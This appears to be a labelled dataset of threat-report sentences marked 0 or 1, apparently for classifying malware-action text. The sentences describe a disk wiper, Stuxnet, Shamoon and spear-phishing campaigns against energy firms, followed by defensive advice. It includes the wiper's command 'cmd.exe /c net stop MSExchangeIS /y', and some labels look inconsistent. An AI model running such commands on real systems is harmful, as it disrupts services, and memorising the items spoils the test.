The second instance of the dropper file installed itself as the '' WinsSchMgmt '' service with '' -k '' as a command line argument , started the service , and then terminated .	1
The '' WinsSchMgmt '' service executed the file with '' -k '' as an argument , which started another instance of the file using '' -s '' as an argument .	1
The '' -s '' instance dropped and executed '' igfxtrayex.exe '' , created '' netver.dat '' , and began generating network traffic over TCP ports 445 and 139 to victim IP addresses .	1
This is a log file created by the dropper , and appended to as the scans progress .	1
It contains what appear to be hostnames , IP addresses , and the number 2 .	0
Entries in the file have the structure '' HOSTNAME | IP Address | 2 '' .	0
This file is destructive malware : a disk wiper with network beacon capabilities .	1
If '' igfxtrayex.exe '' is run with no parameters , it creates and starts a copy of itself with the '' –i '' argument .	1
After 10 minutes , the '' igfxtrayex.exe '' makes three copies of itself and places them in the same directory from which it was executed .	1
These copies are named according to the format '' taskhostXX.exe '' ( where X is a randomly generated ASCII character ) .	0
These copies are then executed , each with a different argument ( one being '' -m '' , one being '' -d '' and the other '' -w '' ) .	1
Network connection attempts are made to one of three hard-coded IP addresses in a random order to port 8080 or 8000 .	1
If a connection to the IP address can not be made , it attempts to connect to another of the three IP addresses , until connections to all three IP addresses have been attempted .	1
The following command-line string is then executed : '' cmd.exe /c net stop MSExchangeIS /y '' .	0
A 120-minute ( 2 hour ) sleep command is issued after which the computer is shut down and rebooted .	1
This file , when executed , starts a listener on localhost port 80 .	1
It has 3 files contained in the resource section ; all xor 'd with 0x63 .	1
This SYS file is a commercially available tool that allows read/write access to files and raw disk sectors for user mode applications in Windows 2000 , XP , 2003 , Vista , 2008 ( 32-bit ) .	0
It is dropped from resource ID 0x81 of '' igfxtrayex.exe '' .	1
This SYS file is a also a commercially available tool that allows read/write access to files and raw disk sectors for user mode applications in Windows 2000 , XP , 2003 , Vista , 2008 ( 64-bit ) .	0
It is dropped from resource ID 0x83 of '' igfxtrayex.exe '' .	1
A summary of the C2 IP addresses : Snort signatures : Listening Implant : Lightweight Backdoor : Proxy Tool : Malware associated with the cyber threat actor : Below are potential YARA signatures to detect malware binaries on host machines : Because of the highly destructive functionality of the malware , an organization infected with the malware could experience operational impacts including loss of intellectual property ( IP ) and disruption of critical systems .	0
Actual impact to organizations may vary depending on the type and number of systems impacted .	0
Implement the indicators of compromise within your systems for detection and mitigation purposes .	0
Encourage users to transfer critical files to network shares , to allow for central backed up .	0
Execute daily backups of all critical systems .	0
Periodically execute an '' offline '' backup of critical files to removable media .	0
Establish emergency communications plans should network resources become unavailable .	0
Isolate any critical networks ( including operations networks ) from business systems .	0
Identify critical systems and evaluate the need for having on-hand spares to quickly restore service .	0
Ensure antivirus is up to date .	0
Disable credential caching for all desktop devices with particular importance on critical systems such as servers and restrict the number of cached credential for all portable devices to no more than three if possible .	0
This can be accomplished through a Group Policy Object ( GPO ) .	0
Disable AutoRun and Autoplay for any removable media device .	0
Prevent or limit the use of all removable media devices on systems to limit the spread or introduction of malicious software and possible exfiltration data , except where there is a valid business case for use .	0
This business case must be approved by the organization Chief IT Security Officer , with policy/guidance on how such media should be used .	0
Consider restricting account privileges .	0
It is our recommendation that all daily operations should be executed using standard user accounts unless administrative privileges are required for that specific function .	0
Configure all standard user accounts to prevent the execution and installation of any unknown or unauthorized software .	0
Both standard and administrative accounts should have access only to services required for nominal daily duties , enforcing the concept of separation of duties .	0
Lastly , disable Web and email capabilities on administrative accounts .	0
Compromise of admin accounts is one vector that allows malicious activity to become truly persistent in a network environment .	0
Ensure that password policy rules are enforced and Admin password values are changed periodically .	0
Consider prohibiting hosts within the production environment or DMZ from sharing an Active Directory enterprise with hosts on other networks .	0
Each environment should have separate forests within Active Directory , with no trust relationships allowed between the forests if at all possible .	0
If necessary , the trust relationships should be one-way with the low integrity environment trusting the higher integrity environment .	0
Consider deployment of a coaching page with click through acceptance ; these are traditionally deployed in an environment to log the acceptance of network acceptable use policy or to notify users of monitoring .	0
Coaching pages also provide some measure of protection from automated malicious activity .	0
This occurs because automated malware is normally incapable of physically clicking an acceptance radial button .	0
Automated malware is traditionally hardcoded to execute , then retrieve commands or additional executables from the Internet .	0
If the malware is unable to initiate an active connection , the full train of infection is potentially halted .	0
The danger still exists that the physical user will authorize access , but through the use of coaching pages , infections can be limited or at least the rate of infection reduced .	0
Monitor logs -- Maintain and actively monitor a centralized logging solution that keeps track of all anomalous and potentially malicious activity .	0
Ensure that all network operating systems , web browsers , and other related network hardware and software remain updated with all current patches and fixes .	0
Organizations should review Security Tip Handling Destructive Malware # ST13-003 and evaluate their capabilities encompassing planning , preparation , detection , and response for such an event .	0
Always keep your patch levels up to date , especially on computers that host public services accessible through the firewall , such as HTTP , FTP , mail , and DNS services .	0
Build host systems , especially critical systems such as servers , with only essential applications and components required to perform the intended function .	0
Any unused applications or functions should be removed or disabled , if possible , to limit the attack surface of the host .	0
Implement network segmentation through V-LANs to limit the spread of malware .	0
Consider the deployment of Software Restriction Policy set to only allow the execution of approved software ( application whitelisting ) .	0
Recommend the whitelisting of legitimate executable directories to prevent the execution of potentially malicious binaries .	0
Consider the use of two-factor authentication methods for accessing privileged root level accounts or systems .	0
Consider deploying a two-factor authentication through a hardened IPsec/VPN gateway with split-tunneling prohibited for secure remote access .	0
Deny direct Internet access , except through the use of proxies for Enterprise servers and workstations .	0
Perform regular content filtering at the proxies or external firewall points of presence .	0
Also consider the deployment of an explicit versus transparent proxy policy .	0
Implement a Secure Socket Layer ( SSL ) inspection capability to inspect both ingress and egress encrypted network traffic for potential malicious activity .	0
Isolate network services , such as email and Web application servers by utilizing a secure multi-tenant virtualization technology .	0
This will limit the damage sustained from a compromise or attack of a single network component .	0
Implement best practice guidance and policy to restrict the use of non-Foundation assets for processing or accessing Foundation-controlled data or systems ( e.g. , working from home , or using a personal device while at the office ) .	0
It is difficult to enforce corporate policies , detect intrusions , and conduct forensic analysis or remediate compromises on non-corporate owned devices .	0
Minimize network exposure for all control system devices .	0
Control system devices should not directly face the Internet .	0
Place control system networks behind firewalls , and isolate or air gap them from the business network .	0
When remote access is required , use secure methods , such as Virtual Private Networks ( VPNs ) , recognizing that VPN is only as secure as the connected devices .	0
Industrial Control System ( ICS ) -CERT and US-CERT remind organizations to perform proper impact analysis and risk assessment prior to taking defensive measures .	0
The energy sector has become a major focus for targeted attacks and is now among the top five most targeted sectors worldwide .	0
Companies in the sector are facing a growing risk of having their services interrupted or losing data .	0
The threat to energy firms is only likely to increase in the coming years as new developments , such as further extensions of smart grids and smart metering expose more infrastructure to the Internet .	0
Equipment that is not connected to the Internet and other networks is not immune to threats and there has already been a number of successful attacks against isolated systems .	0
Operators of critical infrastructure , as well as energy utility companies , need to be aware of these threats and prepare accordingly .	0
The threat to energy firms comes from several different sources .	0
In some cases , espionage from competitors is the primary motive , with data on new projects , exploration and finances being targeted .	0
Disruption and destruction are the goals of other attacks .	0
Some instances appear to be state sponsored , such as the disruption of the Iranian nuclear program by the Stuxnet worm in 2010 , one of the attacks that began this trend .	0
Others appear to be the work of hacktivists with political or environmental agendas .	0
Internal attackers , like disgruntled employees , are also a major source of attacks that often lead to service disruption .	0
The majority of the actors behind these attacks have grown more sophisticated in the way they attack .	0
During the monitoring period from July 2012 to June 2013 , we observed an average of 74 targeted attacks per day globally .	0
Of these , nine attacks per day targeted the energy sector .	0
Accounting for 16.3 percent of all attacks , the energy sector was the second most targeted vertical in the last six months of 2012 , with only the government/public sector exceeding it with 25.4 percent of all attacks .	0
The high ranking was mainly due to a major attack against a global oil company , which we observed in September 2012 .	0
However , in the first half of 2013 the energy sector continued to attract a high proportion of attacks , ranking in fifth place with 7.6 percent of targeted attacks .	0
Not all of the attacks analyzed used highly sophisticated tools .	0
Most of them could have been prevented by following best practice guidelines for protecting the IT infrastructure and the industrial components , indicating that despite high revenues and strategic importance , many energy sector companies are not prioritizing cybersecurity .	0
The number of targeted cyberattacks in general has risen in the past few years .	0
In addition to this , the rate of attack exposure has also risen , with more companies becoming aware of attacks , expecting them and searching for indications of compromise .	0
It is not a new phenomenon , but its importance has grown .	0
The Council on Foreign Relations , a US think tank , reported that energy companies , including oil and gas producers , were often the focus of targeted attacks during summer 2012 .	0
In May 2013 the US Department of Homeland Security ( DHS ) warned of an increase in sabotage attacks against US energy companies located in the Middle East .	0
The government had tracked multiple attacks and issued a warning together with the Industrial Control Systems Cyber Emergency Response Team ( ICS-CERT ) .	0
A report by the US Congress supported this picture , stating that many power utilities companies were under constant or daily attack through cyberspace .	0
Taking into account that successful breaches of critical infrastructures are still rare and that these numbers included generic malware infections , it nevertheless highlights the potential for cyberattacks in the energy sector .	0
As in most sectors , attackers are often after valuable information .	0
For example , we have seen attackers target intellectual property such as technology for photovoltaic research and wind turbines , or data on gas field exploration .	0
Information such as this is of high value and can generate huge profits for attackers or their sponsors .	0
The same information can also be misused for an act of sabotage .	0
Many power utilities companies fear disruptive attacks the most , regardless of whether it is done by internal or external attackers .	0
The energy sector has a high potential for critical disruption through sabotage attacks .	0
Any interruption to the power grid would cause substantial chaos and cascading effects resulting in financial loss .	0
In the past there have been quite a few attacks that included targets in the energy sector .	0
Some of these were more focused , like Stuxnet , Duqu , Shamoon/Disttrack and Night Dragon .	0
Others saw power companies targeted among many other sectors , such as Hidden Lynx , Nitro , Flamer , Net Traveler and Elderwood to name a few .	0
One of the biggest examples , and a game changer for many organizations , was Stuxnet .	0
This targeted sabotage attack , which is believed to have been aimed against uranium enrichment facilities in Iran , made clear what could be done through cyberattacks .	0
It is also clear that the energy sector is not exempt from the generic attacks that every company faces , such as ransomware that locks PCs or financial Trojans that attempt to steal passwords and credit card details .	1
For example , such a case happened in May 2013 , when a small fuel distribution company in North Carolina fell victim to a cyberheist that transferred US $ 800,000 from the company 's bank account .	0
Such threats spread broadly and might impact any person , regardless of their employer .	0
These attackers aim at infecting as many computers as possible in order to maximize their chances of profits .	0
These attacks can include nonspecific data breaches where employee or customer records get stolen , as happened to the US Department of Energy in July 2013 .	1
For this paper we focused on email data from targeted attacks between July 2012 and June 2013 .	0
Even though watering holes are becoming more frequently used in targeted attacks , it is unfortunately quite difficult to reliably map these to individual campaigns .	0
A blocked drive-by download attempt does not give any indication if it was a targeted attack or just general noise .	0
In quite a few cases we see the same common malware , like Poison Ivy , being used by generic attackers and by targeted attacks .	0
In such cases the sole difference between a sophisticated targeted attack and a generic one lies in the person commanding the malware .	0
Historically most industrial control systems ( ICS ) and supervisory control and data acquisition ( SCADA ) systems were in separated networks not connected to the Internet or any other network .	0
Unfortunately this security through segregation approach does not fully protect against cyberattacks .	0
In reality , networks are rarely completely isolated .	0
Often some configuration updates are periodically installed or log files are transferred .	0
If systems are not directly connected , the method of choice for these types of interactions is usually through a USB stick or a non-permanent modem connection , which provides a way into the restricted networks .	0
This allows malware to spread into such isolated networks as demonstrated many times by threats such as Stuxnet .	1
If networks are truly segregated , this would mean that there would be no software updates installed , leaving old vulnerabilities open .	0
There are also issues around processes .	0
For example , the revocation lists for digital certificates are seldom updated and therefore certificates which are no longer valid can not be checked properly and would still be accepted .	0
With the increasing desire for connectivity now reaching industrial plants , many operators have started to connect their ICS to the Internet .	0
New adapters can bridge to older technology which was never intended to be controlled over the Internet , allowing it to be connected easily .	0
This allows for efficient centralized monitoring and , to some extent , remote control of equipment .	0
Depending on the type of machinery controlled through the human-machine interface ( HMI ) of the ICS , not all modifications are possible .	0
Some systems are physically connected in a pure read-only mode for monitoring .	0
And even if they are fully connected , some turbines have physical limitations or emergency systems based on physical effects that can not be overridden by the digital controller .	0
Thus , not all Hollywood scenarios of open flood gates or turbines that fly through the air are possible .	0
However , sabotage attacks that damage equipment are definitely possible , as has already been demonstrated .	1
In the future , more systems are going to implement the failsafe switches in software , opening up the vector for malware attacks .	0
An additional source of concern is that some countries have started to open the energy market for smaller private contributors .	0
This means that almost anyone can use mini power plants like water , wind or photovoltaic sites to feed energy back into the power grid .	0
Often these operators do not have a full IT staff supporting the facilities at hand , which might lead to more vulnerable installations .	0
Furthermore they may deploy new technology which might be untested and contain some unknown vulnerabilities .	0
While these smaller sites make up only a small portion of the grid , new decentralized power input feeds are a challenge for the balance of the power grid as well and need to be carefully monitored .	0
Small outages or changes can have a domino effect for the whole power grid .	0
To increase the exposure of energy firms even further , sites like SHODAN , which is essentially a search engine for devices , enable anyone to easily find exposed controllers on the Internet .	0
Of course not all of the industrial control systems connected to the Internet are critical systems or even real ones .	0
Some researchers have started to create honey pot systems in order to study the attackers , which have apparently already attracted attackers like the Comment Crew/APT1 group , who have broken into these decoy systems .	0
Smart grids and smart metering are bringing significant change to the world 's power systems .	0
Experts predict that billions of smart meters and sensors will be installed worldwide over the next ten years .	0
They enable utility companies to measure energy consumption at a more granular level , creating better flow patterns and enabling different prices for consumption based on the time of day and location .	0
This development brings new opportunities , as well as new challenges .	0
As with any connected infrastructure , it is important to secure the network and its endpoint on multiple levels .	0
There have already been proof of concept attacks that demonstrate how smart meters could be manipulated to send back false information or report incorrect billing IDs , leading to power theft .	1
In addition to the issue of securing these devices , smart grids will produce a huge amount of data which , depending on regulations , will need to be kept for audits .	0
Some of this data may be sensitive and could raise privacy concerns if not properly protected .	0
This could easily grow to petabytes of data that needs to be safely stored and managed .	0
It is beyond the scope of this paper to address all the challenges associated with smart grids and smart meters .	0
Symantec has created a dedicated whitepaper for this topic : How to protect critical infrastructure , mitigate fraud and guarantee privacy .	0
As a member of the CRISALIS project , Symantec is following these developments closely and is helping to secure critical infrastructure together with partners from academia and different industry sectors .	0
There have been numerous cyberattacks against the energy sector over the past few years .	0
Not all of them were the work of sophisticated attackers ; some incidents were just collateral damage caused by malware infections or bad configuration issues .	0
These incidents highlight the fact that such attacks can happen and that they can have real life consequences .	0
In 2013 part of the Austrian and German power grid nearly broke down after a control command was accidentally misdirected .	0
It is believed that a status request command packet , which was broadcast from a German gas company as a test for their newly installed network branch , found its way into the systems of the Austrian energy power control and monitoring network .	0
Once there , the message generated thousands of reply messages , which generated even more data packages , which in turn flooded the control network .	0
To stop this self-inflicted DDoS attack , part of the monitoring and control network had to be isolated and disconnected .	0
Fortunately the situation was resolved without any power outages .	0
In 2008 , Tom Donahue , a senior Central Intelligence Agency ( CIA ) official told a meeting of utility company representatives that cyberattacks had taken out power equipment in multiple cities outside the United States .	1
In some cases the attacker tried to extort money from the energy companies , threatening them with further blackouts .	0
In 2003 the safety monitoring system of the Ohio nuclear power plant apparently went offline for several hours due to a Slammer worm infection .	1
Fortunately the power plant was already offline due to maintenance and the installed secondary backup monitoring system was unaffected by the worm .	0
Nevertheless the incident raised safety concerns .	0
At the beginning of 2003 a marine terminal in Venezuela was targeted by a sabotage attack .	1
Details of this attack are scarce and vague , but it seems that during a strike an attacking group managed to get access to the SCADA network of the oil tanker loading machinery and overwrote programmable logic controllers ( PLCs ) with an empty program module .	1
This halted machinery , preventing oil tankers from loading for eight hour till the unaffected backup code was reinstalled on the PLCs .	1
The attack was not too sophisticated as it was easily spotted .	0
A small modification of the PLC code instead would probably have gone unnoticed for a long time .	0
In 2001 an attack took place against California 's power distribution center , which controls the flow of electricity across California .	0
Due to apparently poor security configuration , the attacker was able to compromise two Web servers that were part of a developer network and penetrate further from there .	0
Fortunately the attackers were stopped before they managed to attack any systems which were tied into the transmission grid for the Western United States .	0
According to Russian officials , the largest natural gas extraction company in the country was successfully attacked in 2000 .	0
The attackers used a Trojan to gain access to the control for the gas pipelines .	1
Through this switchboard , the flow for individual gas pipelines could have been modified , which would easily have caused widespread disruption .	0
Aside from these incidents , there have also been a number of more serious and well-documented targeted attacks against the energy sector : The Stuxnet incident and its relatives Duqu , Flamer and Gauss are some of the most talked-about cases of targeted attacks .	0
As far as we know today , the Stuxnet operation began in November 2005 with the registration of the command and control ( C & C ) servers used in the attacks .	1
The first recorded appearance of what we now call Stuxnet version 0.5 was in November 2007 .	0
Since then , a handful of different versions have been found and analyzed .	0
Stuxnet 1.x is based on what is now known as the '' tilded '' platform ; whereas Stuxnet 0.5 is based on the Flamer framework .	0
The code segments and programming style differ , which indicates that two different programming teams were most likely responsible for the different branches of Stuxnet .	0
Thorough investigation into the mechanism and functions of this threat started in July 2010 .	0
Stuxnet is the first known autonomous threat to target and sabotage industrial control systems to such an extent .	1
Stuxnet is a sophisticated piece of malware , which uses seven vulnerabilities to spread and infect its targets .	1
The most notable vulnerability is the Microsoft Windows Shortcut 'LNK/PIF ' Files Automatic File Execution Vulnerability ( CVE-2010-2568 ) , which allows it to auto-execute on USB drives .	0
Spreading through infected portable media drives allowed it to also infect networks isolated by air gaps that are unreachable from the Internet .	1
This was most likely the first infection vector used by Stuxnet .	0
In addition , it is able to infect Step7 project files , which are used to control Programmable Logic Controllers ( PLCs ) .	1
This allowed the worm to infect computers whenever the engineer exchanged the project files .	1
Besides this , it also spread through network shares , a printer spooler vulnerability , an old Windows RPC ( remote procedure calls ) vulnerability and a known password in the WinCC database .	1
In the end , Stuxnet propagated further than its authors probably intended .	0
We have monitored more than 40,000 infected IP addresses in 155 countries .	0
Many of those systems are most likely just collateral damage and were not intended to be infected by the attackers .	0
For example multiple computers at Chevron were infected by Stuxnet , without any damage being done .	0
Part of the malware code was signed with stolen digital certificates making it harder to detect by security tools .	1
To hide its activity even further , Stuxnet executed slightly different infection routines depending on the security software installed on the target .	1
On the USB drive itself , the malware would hide its own files and even delete itself from it after three successful propagations .	1
Tricks like these , to make the detection of the malware more difficult , are now frequently used in modern targeted attacks .	1
Stuxnet 's payload focused on PLCs , which are used to control different industrial components .	0
The target of the Stuxnet operation is believed to be a uranium enrichment facility in Iran .	0
The sabotage payload disrupted and partially destroyed the cascaded high frequency gas centrifuges .	1
The early version of Stuxnet targeted the S7- 417 PLCs and modified its valve settings .	1
Closing the valves at certain points in time would lead to an increase of pressure that could damage the equipment .	0
The later version of the threat focused on the S7-315 PLCs , manipulating the spinning frequency of the rotating motors .	1
By speeding the centrifuges up and slowing them down repeatedly , the output quality could be spoiled and the centrifuges themselves could be damaged .	0
The payload would only become active if the fingerprint in the found PLC setup matched a given configuration setup .	1
This minimized the collateral damage at other facilities and showed that the attackers had in-depth knowledge of the targeted uranium enrichment facilities .	0
To avoid detection by personnel monitoring the human machine interface ( HMI ) of the plant , the threat recorded measurement readings during normal operation and played those back in a loop .	1
Operation Night Dragon , which was uncovered in 2010 , is a typical example of global oil companies being targeted , but this time not with the aim of disruption in mind .	0
The attacks started in late 2009 and were directed at finding project details and financial information about oil and gas field exploration and bids .	1
The attackers started by compromising public facing Web servers through SQL injection and installing Web shells on them .	1
Once they had control over the server they used common hacking tools to harvest local passwords , dump password hashes , sniff authentication messages and exploit internal active directory configuration .	1
This allowed them to move on to other internal computers using the gathered passwords .	1
In addition , spear phishing messages were used to compromise additional computers .	1
The attackers did not use any zero-day vulnerabilities during their attacks .	0
Rather they used publicly available tools for each individual job .	0
On compromised computers a common Backdoor.Trojan was installed that communicated back to the C & C server , allowing remote access to the computer .	1
This allowed the attacker to find and extract valuable information .	1
In August 2012 an extremely destructive cyberattack hit an estimated 30,000 computers at one of the largest oil producers of the world in Saudi Arabia .	0
The W32.Disttrack malware used in this attack , also known as Shamoon , consists of three components : a dropper , a wiper and a reporter module .	0
The dropper component is responsible for creating all the required files on the system , registering a service called '' TrkSvr '' in order to start itself with Windows .	1
It also attempts to copy itself to accessible network shares and execute itself remotely if successfully copied .	1
The wiper component is only activated when a hardcoded configuration date has been passed .	0
This enables a coordinated , '' time bomb '' scenario .	0
The module then drops a legitimate and digitally signed device driver that provides low level disk access from user space .	1
The malware collects file names and starts overwriting them with a JPEG image or 192KB blocks of random data .	1
At the end Disttrack finishes the computer off by wiping the master boot record with the same data .	1
The reporter component is responsible for sending back a HTTP GET request to the C & C server .	1
It reports the domain name , IP address and number of files overwritten .	1
By acquiring user credentials and gaining access to the domain controller the attackers were able to push the malware on to many systems before they triggered the destructive payload .	1
Disttrack 's secondary goal may have been to steal valuable information from infected computers , but the main intent was to render the computers unusable by wiping the operating system and master boot record , causing disruption and downtime at the targeted company .	1
Although wiping is also frequently used to destroy evidence of the attack and make forensics more difficult .	1
The malware does not contain any payload against ICS , like Stuxnet does for PLCs , and is not as sophisticated .	0
According to the company , no computer related with the production or distribution of oil was affected , since the operational network is separated and specially protected .	0
One group that claimed responsibility for the attack posted on Pastebin that it was an anti-oppression hacker group .	0
The attack was prompted by disappointment with some of the regimes in the Middle East , the group said .	0
True or not , this shows that it is not necessarily only state-sponsored attackers who are carrying out disruptive attacks .	0
Sabotage attacks usually fall into the orbit of hacktivists , who seek attention rather than profit .	0
Some sources reported that the attackers had help from insiders , which would explain the so far unclear infection vector .	0
Soon after this attack became known , a Qatari gas company was attacked in a similar way .	0
Spear phishing is , along with watering hole attacks , one of the most common attack vectors used to attack companies .	1
The attacks are simple to carry out .	0
They often follow the same pattern , starting with a reconnaissance phase to gather all publicly available information .	0
This is followed by the incursion phase of breaking in and compromising computers .	1
After that comes the discovery phase , where the attacker gathers passwords and maps the internal network .	1
The final stage is capture and exfiltration , where the valuable information is copied and sent back to the attacker .	1
The last phase may also involve a disruption attack if the goal is sabotage .	0
For a more detailed analysis of the attack phases , see Appendix C. A spear phishing attack consists of an email with either a malicious attachment or a link to a malicious website .	0
Such emails are sent in bulk to a handful of key users .	0
These waves are often repeated till enough people fall for the bait and compromise their computers .	0
For analysis on the social engineering themes used , attack details and attachment types used , see Appendix A .	0
Some of the spear phishing campaigns are smaller in scale and are focused on specific targets .	0
For example , on January 1 , 2013 a global energy research company was targeted .	0
A wave of spear phishing emails were sent from two Freemailer accounts to 291 individuals at the targeted company .	1
All receiving email addresses started with a letter between G and R , covering half of the alphabet .	0
Whether there was a second wave of emails using the other half of the alphabet or whether the attackers only got their hands on part of the address book remains unknown .	0
All emails had either the subject line '' 2013 , Obama QE4 ! Merry Christmas ! '' or '' 2013 , Obama QE4 ! '' .	0
It is common to see spear phishing attacks take place around holidays , as people are receiving more emails during these times and are less likely to perform due diligence while opening them .	0
All of the emails contained the same Trojan.Dropper disguised as an attachment with the filename AVP.dll .	1
The malware itself drops a malicious Downloader '' clbcatq.dll '' into a newly created '' wuauclt '' directory , posing as Windows update and taking advantage of the DLL search order hijack weakness in order to load the malicious code in Windows .	1
The same family of dropper has been used in previous targeted attacks against other sectors , indicating that a group with multiple interests is behind the attacks .	0
The back door provided full access to the compromised computers .	1
A week later , on January 7 , 2013 , the group attacked the same company again .	0
Seventy emails were sent to 58 individuals using either '' 2012-13 NFL Playoffs Schedule '' or '' Re : 2012-13 NFL Playoffs Schedule '' as a subject line .	0
In this wave , the attackers used a similar AVP.dll to the one used before .	0
In some of the emails , an additional CHM file with an old exploit was used in an effort to maximize the chances of a successful infection .	0
After this second wave , the attack ceased .	0
It is unknown if the attackers successfully retrieved the information they were seeking , if they installed other back door Trojans or gained passwords that allowed them to directly access the computers , or if they have given up on the target .	1
A global oil company , with offices around the world , had been under continuous attack for some time , but in September 2012 we noticed an upsurge in activity , with 34 times more suspicious emails than on average .	0
This provided a clear indication that something suspicious was going on .	0
At the end of this wave of emails , a hotel chain , a rental car company and two financial institutions were also targeted by the same attacker .	0
This may have been an attempt to find further information that could be used in a future social engineering attack against the oil company .	0
In total , 136 email accounts at the oil company were targeted .	0
A regional sales manager in Greece received 412 emails over the 12 month period , with 155 different attachments .	0
A HR person in the same country received the second largest amount of emails with 90 in total .	0
Seventeen other people were targeted between 70 and 90 times , many in the same region .	0
The rest of the targeted people received less than five emails each , in what seems to have been an undirected spraying in the hope that at least some would fall for the bait .	0
Clearly the one person that received the highest volume of emails was deemed to be of high value to the attackers .	0
Possible explanations for the attack could be that a competitor wanted to know more about some upcoming deal or details on the oil field exploration , but this would be highly speculative .	0
The spear phishing emails came from 234 spoofed addresses .	1
They were made to appear to be linked to the company in relation to the subject and attachment chosen .	1
Many of the emails came from the same country as the main targeted sales manager .	0
The emails all contained malicious attachments .	1
None of them linked to third party sites for drive-by downloads .	0
Of the attachments , 1,588 had a .exe	0
extension .	0
Of those , 842 had a .pdf.exe	0
extension .	0
The malware chosen was a variant of the Poison Ivy Trojan Backdoor.Darkmoon and , in some minor cases , Trojan droppers that would download additional malware .	1
The attackers did not use any zero-day exploits to drop a payload .	0
The social engineering messages concentrated mainly around the following two themes : Once installed , the back door would create a registry run key in order to restart with Windows and connect to one of three C & C servers located in Greece .	1
The last C & C server has been used since 2010 in similar attacks against other companies .	1
Other sub-domains at the same free host and DNS service have been used by other groups to spread malware in the past .	0
The chosen names of the C & C server domains imitates legitimate services in a bid to be overlooked by the system administrators when checking their logs .	1
The back door provides full remote access to the compromised computers , allowing for extraction of any data .	1
It is unknown if the attackers succeeded in their goal and if valuable information has been extracted .	0
The attacks did not completely disappear , but the email volume decreased significantly to only a few emails per week afterwards .	0
As with all targeted attacks , there are many different groups of attackers operating in this field .	0
These attacks can not be attributed to only one group or geographical region .	0
We have seen individuals , competitors , hacktivist groups and possible state sponsored agents carrying out attacks against energy companies .	0
Some of the attacks have been purely opportunistic , seeking any valuable information available .	0
Other campaigns look like they were planned over a lengthy period and carried out methodically with a clear goal in mind .	0
The attackers tend to go after valuable information , including maps of new gas fields or research on efficient photovoltaic generators .	0
This information can be of great value to competitors or nations that want to make progress in the same field .	0
Another motivation for attackers is to profit from the information stolen by blackmailing the company .	0
The same information can be used to carry out sabotage attacks designed to disrupt ICSs , as the energy sector is also a primary target for sabotage attacks which will not generate direct profit for the attacker .	0
A competitor might be interested in generating bad press and bad customer experience for a rival company , in order to win some new clients .	0
For example , in January 2013 a group claiming to be related to Anonymous posted access details for what they said were Israeli SCADA systems for power plants and other systems .	0
Meanwhile , '' Operation Save the Arctic '' targeted multiple oil companies around the globe in protest against drilling plans in the Arctic .	0
Disgruntled employees are also a source of attacks that should not be underestimated .	0
With their knowhow about internal critical processes and systems they often know how to inflict serious damage .	0
They may be able to perform system modifications that could go unnoticed for a long periods .	0
For all regular client computers , the well-established best practice guidelines apply .	0
These computers are often the first ones to be attacked .	0
Once compromised , the attacker will use these computers and try to explore deeper into internal networks .	0
Securing and hardening of deployed operating systems with a working strategy for patch deployment is important .	0
Reoccurring security awareness training can help users to identify social engineering attempts and prevent them from falling victim to them in the first place .	0
The company can perform penetration testing on Web and network applications but also on ICSs to identify and remedy any vulnerability .	0
For examples Web applications should be tested against SQL injection attacks .	0
This can also help confirm if applied polices are followed through , if the patch level is correct on all computers and if systems are compliant .	0
Companies can monitor the Internet for information about attacks in the same vertical and apply lessons learned where possible .	0
In addition , different layers of security products can help achieve better overall protection .	0
• Security Information and Event Manager system ( SIEM ) : Using a SIEM can help correlate all related alerts in one place .	0
This centralized view can be cross referenced with threat intelligence data to generate prioritization and an action plan .	0
Painting the bigger picture of the overall security state can reveal previously unnoticed attacks .	0
For example failed login attempts on internal servers could indicate a password breach .	0
This includes logging of critical systems and synchronization of time among multiple systems .	0
• Ingress and egress filtering : Filtering the network traffic with firewalls , content filters and IPS allows the control of data flows .	0
This can prevent attackers from reaching internal systems .	0
It is important to also monitor outbound traffic , as data exfiltration is a key point for cyberespionage .	0
It should be noted that with the increased use of cloud services and mobile devices , some traffic might never pass through the company 's gateways .	0
Where traffic blocking is too disruptive at least monitoring should be implemented .	0
• Data loss prevention ( DLP ) : DLP solutions can track the access and flow of critical information and prevent it from leaving the company or encrypt it automatically .	0
• Endpoint protection : Depending on the usage pattern of the computer , different solutions are available to protect the endpoint .	0
Antivirus solution with proactive detection methods like behavioral analysis and reputation scanning can prevent unknown malware from installing itself .	0
HIPS ( host based intrusion prevention systems ) , behavioral lockdown or whitelisting can protect computers from any kind of unwanted tampering without the need of constant updates .	0
• System protection : For non-standard IT systems , hardening can increase the security .	0
On industrial systems which are not often updated or that can not be updated , exploitation can be prevented with the help of lockdown solutions like Symantec Critical System Protection ( CSP ) .	0
Through policies , only trusted system applications are allowed to run .	0
ICS should be regularly checked and upgraded if new firmware exists .	0
Where this is not possible HIPS and behavioral lockdown tools can be used to secure computers .	0
• Email filtering : Proper email filtering can prevent many spear phishing attempts from reaching users .	0
They can help minimize the risk of an untrained user falling for social engineering tricks .	0
• Authentication : Some of the ICS contain hardcoded passwords and , wherever possible , these should be changed .	0
ICS frequently use weakly authenticated protocols that allow for impersonation attacks .	0
Where possible those authentication methods should be upgraded or at least closely monitored .	0
Strong authentication or PKI should be used where applicable .	0
Industrial control systems ( ICS ) should be specially protected and monitored .	0
The control system and control network should be secured .	0
Where possible , ICS should be separate from the Intranet .	0
Isolating these networks alone is often not enough to protect the control network , but it can make it more difficult for attackers to succeed .	0
For some systems it can make sense to have a plan to quickly disconnect or separate critical machines in the event of a detected cyberattack .	0
Cyberespionage campaigns and sabotage attacks are becoming increasingly common , with countless threat actors attempting to gain a foothold in some of the best protected organizations .	0
At this stage , roughly five targeted attacks per day are being mounted on firms in the energy sector .	0
These attacks have become increasingly sophisticated , although the capabilities and tactics used by these threat actors vary considerably .	0
In the second half of 2012 , the energy sector was the second most targeted with 16 percent of all the targeted attacks .	0
This strong increase was mainly due to a large scale attack against one global oil company .	0
In the first half of 2013 , the energy sector was ranked fifth with 7.6 percent of all attacks focused on this sector .	0
In general we have observed that attackers are becoming more efficient and focusing on smaller operations that attract less attention .	0
The attackers tend to go after valuable information – such as maps of a new gas field – but the sector is also a major target for sabotage attacks , which will not generate direct profit for the attacker .	0
Such disruptive attacks do already happen and may lead to large financial losses .	0
State sponsored agents , competitors , internal attackers or hacktivists are the most likely authors of such sabotage attacks .	0
Fortunately , there have not been many successful sabotage attacks against energy companies to date .	0
However , the increasing number of connected systems and centralized control for ICS systems means that the risk of attacks in the future will increase .	0
Energy and utility companies need to be aware of these risks and plan accordingly to protect their valuable information as well as their ICS or SCADA networks .	0
Social engineering is an essential part of spear phishing campaigns .	0
A cleverly chosen , enticing message may prompt the user into opening an attachment .	0
